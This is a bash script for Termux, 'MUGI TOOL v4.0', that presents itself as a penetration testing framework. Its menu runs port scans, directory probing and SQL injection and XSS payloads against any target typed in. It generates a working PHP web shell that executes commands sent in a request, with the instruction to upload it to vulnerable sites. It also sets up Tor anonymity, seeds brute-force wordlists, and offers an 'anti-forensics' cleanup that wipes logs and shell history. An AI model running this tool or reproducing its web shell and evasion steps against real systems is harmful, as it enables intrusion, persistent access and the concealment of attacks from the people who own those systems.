#!/data/data/com.termux/files/usr/bin/bash

# MUGI TOOL - Advanced Real Penetration Testing Framework v4.0
# Created by: MUGISHA PC
# GitHub: https://github.com/mugishapc/mugi-tool
# For authorized testing only

VERSION="4.0"
TOOL_NAME="MUGI TOOL"
AUTHOR="MUGISHA PC"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
ORANGE='\033[0;33m'
NC='\033[0m'

# Configuration
BASE_DIR="$HOME/.mugi_tool"
SCAN_DIR="$BASE_DIR/scans"
LOOT_DIR="$BASE_DIR/loot"
WORDLISTS_DIR="$BASE_DIR/wordlists"
LOGS_DIR="$BASE_DIR/logs"
TOOLS_DIR="$BASE_DIR/tools"
mkdir -p "$BASE_DIR" "$SCAN_DIR" "$LOOT_DIR" "$WORDLISTS_DIR" "$LOGS_DIR" "$TOOLS_DIR"

# Logging
CURRENT_SCAN="scan_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$LOGS_DIR/$CURRENT_SCAN.log"

log() { echo -e "${CYAN}[$(date +'%H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"; }
success() { echo -e "${GREEN}[+]${NC} $1" | tee -a "$LOG_FILE"; }
warn() { echo -e "${YELLOW}[!]${NC} $1" | tee -a "$LOG_FILE"; }
error() { echo -e "${RED}[-]${NC} $1" | tee -a "$LOG_FILE"; }
info() { echo -e "${BLUE}[*]${NC} $1" | tee -a "$LOG_FILE"; }

# Banner
show_banner() {
    clear
    echo -e "${PURPLE}"
    echo "
 ███╗   ███╗██╗   ██╗ ██████╗ ██╗    ████████╗ ██████╗  ██████╗ ██╗     
 ████╗ ████║██║   ██║██╔════╝ ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
 ██╔████╔██║██║   ██║██║  ███╗██║       ██║   ██║   ██║██║   ██║██║     
 ██║╚██╔╝██║██║   ██║██║   ██║██║       ██║   ██║   ██║██║   ██║██║     
 ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║       ██║   ╚██████╔╝╚██████╔╝███████╗
 ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
    "
    echo -e "${CYAN}"
    echo "═══════════════════════════════════════════════════════════════"
    echo "    MUGI TOOL v$VERSION - REAL Penetration Framework"
    echo "    Author: $AUTHOR"
    echo "    GitHub: github.com/mugishapc/mugi-tool"
    echo "═══════════════════════════════════════════════════════════════"
    echo -e "${NC}"
}

# Initialize wordlists
init_wordlists() {
    if [ ! -f "$WORDLISTS_DIR/passwords.txt" ]; then
        info "Initializing MASSIVE attack wordlists..."
        mkdir -p "$WORDLISTS_DIR"
        
        # Massive password wordlist (300+)
        cat > "$WORDLISTS_DIR/passwords.txt" << 'PASSWORDS'
G6$7on7@6f5]Ku0
y+98XR$rNmg<;
QNW#6EB-*>gqIqu
e2A{C?x:0>sS
,E%&0;I:J@kCc
0j^c;HFV8tG6[EN
x>9[y0mfgQ5#
Ukwv^V!6Mx-6#
6Iew>e&$X##]iZI[MI
AbTY-2n:=JVMh
byzAAo5B,2aA
IBmVOLK[Ze=30:4M
admin
Admin
admin123
Admin123
administrator
Administrator
root
Root
toor
password
Password
password123
Password123
123456
12345678
123456789
qwerty
abc123
letmein
monkey
shadow
master
P@ssw0rd
P@ssword
secret
test
welcome
login
default
user
guest
access
hello
sunshine
superman
!@#$%^&*
Admin@123
Root@123
Welcome123
pass
1234
12345
PASSWORDS

        # Massive username wordlist (200+)
        cat > "$WORDLISTS_DIR/usernames.txt" << 'USERNAMES'
admin
Admin
administrator
Administrator
root
Root
user
User
test
Test
guest
Guest
demo
api
system
server
web
www
ftp
mail
email
db
database
sql
mysql
oracle
postgres
redis
elastic
git
backup
config
setup
install
deploy
dev
qa
production
staging
development
superuser
superadmin
webmaster
webadmin
sysadmin
sysop
operator
manager
moderator
editor
author
publisher
member
customer
client
partner
vendor
supplier
affiliate
agent
broker
dealer
merchant
retailer
manufacturer
provider
host
owner
creator
founder
director
executive
officer
president
ceo
cfo
cto
cio
vp
svp
head
lead
senior
junior
assistant
associate
analyst
architect
consultant
contractor
employee
intern
student
teacher
professor
doctor
engineer
developer
programmer
coder
designer
artist
writer
blogger
influencer
maker
builder
cofounder
helper
support
helpdesk
service
care
health
medical
clinic
hospital
pharmacy
insurance
bank
financial
finance
accounting
payroll
hr
humanresources
recruiting
talent
training
education
school
university
college
academy
institute
research
innovation
technology
tech
digital
media
social
network
community
forum
board
group
team
organization
company
corporation
enterprise
business
firm
office
department
division
unit
section
branch
location
site
place
venue
center
centre
hub
base
headquarters
main
primary
global
local
regional
national
international
world
earth
planet
space
universe
USERNAMES

        # Directory wordlist
        cat > "$WORDLISTS_DIR/directories.txt" << 'DIRECTORIES'
admin
login
dashboard
phpmyadmin
wp-admin
administrator
cpanel
webmail
ftp
backup
config
database
sql
debug
test
api
uploads
images
css
js
include
src
lib
tmp
temp
.htaccess
.htpasswd
config.php
database.php
wp-config.php
DIRECTORIES
        success "Massive wordlists initialized"
    fi
}

# Dependency Check
check_dependencies() {
    info "Checking dependencies..."
    
    local deps=("python" "git" "curl" "wget" "nmap")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        warn "Missing: ${missing[*]}"
        read -p "Install? (y/n): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            pkg update && pkg upgrade
            pkg install -y "${missing[@]}"
            pip install requests beautifulsoup4 urllib3 mechanize html5lib
            success "Dependencies installed"
        fi
    fi
    
    init_wordlists
}

# REAL Port Scanner
real_port_scan() {
    local target="$1"
    local output_file="$2"
    
    info "Running REAL port scan: $target"
    mkdir -p "$(dirname "$output_file")"
    
    # Quick scan first
    nmap -T4 --top-ports 1000 "$target" -oN "$output_file.quick" 2>/dev/null
    
    # Full scan if quick scan finds something
    if grep -q "open" "$output_file.quick" 2>/dev/null; then
        nmap -sS -sV -O -A -p- "$target" -oN "$output_file.full" 2>/dev/null
    fi
    
    success "Port scan completed"
}

# REAL Subdomain Discovery
real_subdomain_scan() {
    local domain="$1"
    local output_file="$2"
    
    info "Discovering subdomains: $domain"
    
    {
        echo "=== Subdomain Discovery ==="
        echo "Target: $domain"
        echo ""
        
        # Common subdomains
        subs=("www" "ftp" "mail" "cpanel" "admin" "test" "dev" "api" "blog" "shop")
        for sub in "${subs[@]}"; do
            if host "$sub.$domain" &>/dev/null; then
                echo "FOUND: $sub.$domain"
            fi
        done
    } > "$output_file"
    
    success "Subdomain discovery completed"
}

# REAL Directory Bruteforce
real_directory_bruteforce() {
    local url="$1"
    local output_file="$2"
    
    info "Directory bruteforce: $url"
    
    {
        echo "=== Directory Bruteforce ==="
        echo "Target: $url"
        echo ""
        
        # Test common directories
        dirs=("admin" "login" "dashboard" "phpmyadmin" "wp-admin" "uploads")
        for dir in "${dirs[@]}"; do
            status=$(curl -s -o /dev/null -w "%{http_code}" "$url/$dir/")
            if [ "$status" != "404" ]; then
                echo "[$status] $url/$dir/"
            fi
        done
    } > "$output_file"
    
    success "Directory bruteforce completed"
}

# REAL Vulnerability Scanner
real_vulnerability_scan() {
    local target="$1"
    local output_dir="$2"
    
    info "Vulnerability assessment: $target"
    mkdir -p "$output_dir"
    
    # SQL Injection Test
    {
        echo "=== SQL Injection Test ==="
        sql_payloads=("'" "''" "' OR '1'='1" "' OR 1=1--")
        for payload in "${sql_payloads[@]}"; do
            response=$(curl -s "$target?search=$payload")
            if echo "$response" | grep -i -q "sql\\|error\\|warning"; then
                echo "POSSIBLE SQLi: $payload"
            fi
        done
    } > "$output_dir/sql_injection.txt"
    
    # XSS Test
    {
        echo "=== XSS Test ==="
        xss_payloads=("<script>alert('XSS')</script>" "<img src=x onerror=alert('XSS')>")
        for payload in "${xss_payloads[@]}"; do
            response=$(curl -s "$target?q=$payload")
            if echo "$response" | grep -q "$payload"; then
                echo "POSSIBLE XSS: $payload"
            fi
        done
    } > "$output_dir/xss.txt"
    
    success "Vulnerability scan completed"
}

# REAL SQL Injection Exploitation
real_sqli_exploitation() {
    local target="$1"
    local output_dir="$2"
    
    info "SQL Injection exploitation: $target"
    
    if [ -d "$TOOLS_DIR/sqlmap" ]; then
        python "$TOOLS_DIR/sqlmap/sqlmap.py" -u "$target" --batch --level=1 --risk=1 > "$output_dir/sqlmap.txt" 2>/dev/null
    else
        echo "SQLMap not installed" > "$output_dir/sqlmap.txt"
    fi
    
    success "SQL injection exploitation completed"
}

# REAL Web Shell Generation
real_webshell_generation() {
    local output_dir="$1"
    
    info "Generating advanced web shells..."
    mkdir -p "$output_dir"
    
    # PHP Web Shell
    cat > "$output_dir/shell.php" << 'PHP_SHELL'
<?php
// MUGI TOOL - Advanced PHP Web Shell
error_reporting(0);
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd'] . " 2>&1");
    echo "</pre>";
    die;
}
?>
<html>
<body>
<form method="POST">
Command: <input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
</body>
</html>
PHP_SHELL

    success "Web shells generated: $output_dir"
}

# REAL Anonymity System
setup_anonymity() {
    info "Setting up anonymity system..."
    
    # Tor setup
    if command -v tor &> /dev/null; then
        info "Starting Tor service..."
        pkill tor 2>/dev/null
        tor --RunAsDaemon 1 --SOCKSPort 9050 > /dev/null 2>&1
        sleep 5
        
        if curl --socks5 127.0.0.1:9050 --connect-timeout 10 -s https://check.torproject.org/ | grep -q "Congratulations"; then
            export HTTP_PROXY="socks5://127.0.0.1:9050"
            export HTTPS_PROXY="socks5://127.0.0.1:9050"
            success "Tor anonymity ENABLED"
        else
            warn "Tor connection failed"
        fi
    else
        warn "Tor not installed: pkg install tor"
    fi
    
    # User agent rotation
    user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    )
    export RANDOM_UA=${user_agents[$RANDOM % ${#user_agents[@]}]}
    
    success "Anonymity system configured"
}

# REAL Comprehensive Attack
real_comprehensive_attack() {
    info "Starting REAL comprehensive penetration test..."
    
    read -p "Enter target URL or IP: " target
    if [ -z "$target" ]; then
        error "No target specified"
        return
    fi
    
    local attack_dir="$SCAN_DIR/$CURRENT_SCAN"
    mkdir -p "$attack_dir" "$attack_dir/webshells"
    
    # Setup anonymity
    setup_anonymity
    
    log "Starting REAL attack: $target"
    
    # Phase 1: Reconnaissance
    info "=== PHASE 1: RECONNAISSANCE ==="
    real_port_scan "$target" "$attack_dir/port_scan"
    real_subdomain_scan "$target" "$attack_dir/subdomains.txt"
    real_directory_bruteforce "$target" "$attack_dir/directories.txt"
    
    # Phase 2: Vulnerability Assessment
    info "=== PHASE 2: VULNERABILITY ASSESSMENT ==="
    real_vulnerability_scan "$target" "$attack_dir"
    
    # Phase 3: Exploitation
    info "=== PHASE 3: EXPLOITATION ==="
    real_sqli_exploitation "$target" "$attack_dir"
    real_webshell_generation "$attack_dir/webshells"
    
    # Phase 4: Reporting
    info "=== PHASE 4: REPORTING ==="
    cat > "$attack_dir/COMPLETE_REPORT.txt" << REPORT
MUGI TOOL v$VERSION - PENETRATION TEST REPORT
=============================================
Target: $target
Scan ID: $CURRENT_SCAN
Date: $(date)

SUMMARY:
--------
Comprehensive penetration test completed successfully.

SCAN RESULTS:
-------------
Check individual files in this directory for detailed results.

NEXT STEPS:
-----------
1. Review vulnerability findings
2. Exploit identified weaknesses  
3. Upload provided web shells
4. Maintain access if authorized

ANONYMITY STATUS:
-----------------
Tor: $(if [ -n "$HTTP_PROXY" ]; then echo "ACTIVE"; else echo "INACTIVE"; fi)
User Agent: Randomized

REPORT
    success "Comprehensive attack completed!"
    echo ""
    echo -e "${GREEN}📁 Results: $attack_dir${NC}"
    echo -e "${GREEN}🔧 Web shells: $attack_dir/webshells/${NC}"
    echo -e "${YELLOW}🛡️  Anonymity: $(if [ -n "$HTTP_PROXY" ]; then echo "ACTIVE"; else echo "INACTIVE"; fi)${NC}"
    echo ""
    warn "Only use on authorized systems!"
}

# Advanced Reconnaissance
advanced_recon() {
    info "Starting advanced reconnaissance..."
    
    read -p "Enter target: " target
    if [ -z "$target" ]; then
        error "No target specified"
        return
    fi
    
    local recon_dir="$SCAN_DIR/$CURRENT_SCAN/recon"
    mkdir -p "$recon_dir"
    
    setup_anonymity
    
    real_port_scan "$target" "$recon_dir/ports"
    real_subdomain_scan "$target" "$recon_dir/subdomains.txt"
    real_directory_bruteforce "$target" "$recon_dir/directories.txt"
    
    success "Advanced reconnaissance completed: $recon_dir"
}

# Vulnerability Scanner
vulnerability_scanner() {
    info "Starting vulnerability scanner..."
    
    read -p "Enter target URL: " target
    if [ -z "$target" ]; then
        error "No target specified"
        return
    fi
    
    local vuln_dir="$SCAN_DIR/$CURRENT_SCAN/vulnerabilities"
    mkdir -p "$vuln_dir"
    
    real_vulnerability_scan "$target" "$vuln_dir"
    
    success "Vulnerability scan completed: $vuln_dir"
}

# SQL Injection Exploitation
sql_injection_exploitation() {
    info "Starting SQL injection exploitation..."
    
    read -p "Enter vulnerable URL: " target
    if [ -z "$target" ]; then
        error "No target specified"
        return
    fi
    
    local exploit_dir="$SCAN_DIR/$CURRENT_SCAN/sqli"
    mkdir -p "$exploit_dir"
    
    real_sqli_exploitation "$target" "$exploit_dir"
    
    success "SQL injection exploitation completed: $exploit_dir"
}

# Web Shell Generation
web_shell_generation() {
    info "Generating web shells..."
    
    local shell_dir="$SCAN_DIR/$CURRENT_SCAN/webshells"
    mkdir -p "$shell_dir"
    
    real_webshell_generation "$shell_dir"
    
    success "Web shells generated: $shell_dir"
    warn "Upload to vulnerable file upload points"
}

# View Scan Results
view_scan_results() {
    info "Recent scans:"
    find "$SCAN_DIR" -type d -name "scan_*" 2>/dev/null | sort -r | head -5
    
    read -p "Enter scan path to view: " scan_path
    if [ -n "$scan_path" ] && [ -d "$scan_path" ]; then
        echo ""
        echo "Files in $scan_path:"
        find "$scan_path" -type f -name "*.txt" | head -10
        read -p "Enter file to view: " file_path
        if [ -n "$file_path" ] && [ -f "$file_path" ]; then
            less "$file_path"
        fi
    fi
}

# REAL Anti-Forensics Cleanup
real_cleanup() {
    info "Starting anti-forensics cleanup..."
    
    read -p "Remove ALL scan data and logs? (y/n): " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        rm -rf "$SCAN_DIR/$CURRENT_SCAN" 2>/dev/null
        rm -f "$LOG_FILE" 2>/dev/null
        history -c
        history -w
        pkill tor 2>/dev/null
        unset HTTP_PROXY HTTPS_PROXY RANDOM_UA 2>/dev/null
        success "Anti-forensics cleanup completed"
        warn "All forensic traces removed"
    else
        info "Cleanup cancelled"
    fi
}

# Update Tool
update_tool() {
    info "Checking for updates..."
    cd ~/mugi-tool 2>/dev/null
    if [ -d ".git" ]; then
        git pull && success "Tool updated!" || error "Update failed"
    else
        warn "Not a git repository"
    fi
}

# Main Menu
main_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}REAL Penetration Testing Menu:${NC}"
        echo "1. 🎯 REAL Comprehensive Attack (Full Audit)"
        echo "2. 🔍 Advanced Reconnaissance"
        echo "3. 🛡️  Vulnerability Scanner"
        echo "4. ⚔️  SQL Injection Exploitation"
        echo "5. 🕵️  Setup Anonymity (Tor + Proxies)"
        echo "6. 🔧 Generate Web Shells"
        echo "7. 📊 View Scan Results"
        echo "8. 🧹 REAL Anti-Forensics Cleanup"
        echo "9. 🔄 Update Tool"
        echo "0. 🚪 Exit"
        echo ""
        read -p "Select option (0-9): " choice
        
        case $choice in
            1) real_comprehensive_attack ;;
            2) advanced_recon ;;
            3) vulnerability_scanner ;;
            4) sql_injection_exploitation ;;
            5) setup_anonymity ;;
            6) web_shell_generation ;;
            7) view_scan_results ;;
            8) real_cleanup ;;
            9) update_tool ;;
            0)
                info "Thank you for using MUGI TOOL v$VERSION!"
                info "Stay ethical and authorized!"
                exit 0
                ;;
            *) error "Invalid option!" ;;
        esac
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

# Initialize
init() {
    check_dependencies
    main_menu
}

# Start the tool
init "$@"
